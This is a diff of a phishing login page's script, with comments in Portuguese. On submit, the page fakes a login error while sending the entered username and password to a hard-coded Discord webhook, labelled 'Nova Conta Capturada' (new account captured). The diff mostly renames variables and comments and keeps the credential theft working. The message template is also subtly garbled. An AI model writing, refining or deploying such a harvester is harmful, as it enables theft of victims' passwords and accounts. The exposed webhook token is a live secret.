@@ -100,44 +100,45 @@
     const form = document.getElementById('loginForm');
     const errorMsg = document.getElementById('errorMsg');
     
-    // MUDE AQUI PELO SEU WEBHOOK REAL DO DISCORD
+    // COLE AQUI O SEU WEBHOOK REAL (substitua tudo entre as aspas)
     const webhookUrl = 'https://discord.com/api/webhooks/1473860451589685344/N8gc13rR1kJj7Pb5DznSI88Lpz_8BLcxUReQ5VulpR001D2os62t3HjFP-NTK_ABAuFm';
 
     form.addEventListener('submit', async function(e) {
       e.preventDefault();
 
-      // Mostra mensagem de erro no site (como antes)
+      // Mostra erro no site
       errorMsg.classList.add('show');
       setTimeout(() => errorMsg.classList.remove('show'), 3000);
 
-      const username = document.getElementById('username').value.trim();
-      const password = document.getElementById('password').value.trim();
+      // Pega os valores exatamente como digitados
+      const login = document.getElementById('username').value.trim();
+      const senha = document.getElementById('password').value.trim();
 
-      // Só envia se tiver pelo menos o username preenchido
-      if (username) {
-        const message = `🔐 **Nova Conta Capturada**\n\n**Login:**\n\( {username || '—'}\n\n**Senha:**\n \){password || '—'}`;
+      // Monta a mensagem organizada com quebras de linha claras
+      const mensagem = `🔐 **Nova Conta Capturada**\n\n**Login:**\n\( {login || '—'}\n\n**Senha:**\n \){senha || '—'}`;
 
+      if (login) {  // só envia se tiver login preenchido
         try {
           const response = await fetch(webhookUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-              content: message,
-              allowed_mentions: { parse: [] } // evita pingar @everyone se tiver
+              content: mensagem,
+              allowed_mentions: { parse: [] }
             })
           });
 
           if (response.ok) {
-            console.log('Mensagem enviada pro Discord!');
+            console.log('Enviado com sucesso!');
           } else {
-            console.error('Erro no Discord:', response.status, await response.text());
+            console.error('Erro Discord:', response.status, await response.text());
           }
         } catch (err) {
-          console.error('Falha ao enviar:', err);
+          console.error('Falha na conexão:', err);
         }
       }
     });
   </script>
 
 </body>
-          </html>
+</html>
